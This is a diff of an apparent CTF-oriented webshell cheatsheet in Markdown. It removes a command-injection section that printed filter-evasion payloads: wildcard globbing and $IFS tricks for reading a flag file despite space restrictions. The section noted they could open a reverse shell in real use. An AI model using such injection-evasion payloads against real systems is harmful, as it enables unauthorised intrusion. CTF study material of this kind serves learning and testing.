@@ -1,5 +1,4 @@
 # Webshell
-*  [Command injection](#command-injection)  
 *  [Webshell cheatsheet](#webshell-cheatsheet)  
 *  [Bypass blacklist extension](#bypass-blacklist-extension)  
 *  [SQL inj to webshell](#sql-inj-to-webshell)  
@@ -7,23 +6,6 @@
 *  [Reverse shell](#reverse-shell)  
 *  [Privilege escalation](#privilege-escalation)  
 *  [Reference](#reference)
-
-# Command injection
-In CTF, we can directly cat flag with cmd injection. In real world, we can directly make a reverse shell with it.  
-```php
-// match one character
-cat fla?
-cat ./???sword
-
-// match multiple character
-cat f*
-
-// bypass the limit on space character
-cat${IFS}flag
-cat$IFSflag
-IFS=,;`cat<<<cat,flag`    // assign comma to separator, let cat,flag be the input to cat
-cat< flag          // let cmd read from the file
-```
 
 # Webshell cheatsheet
 ```php
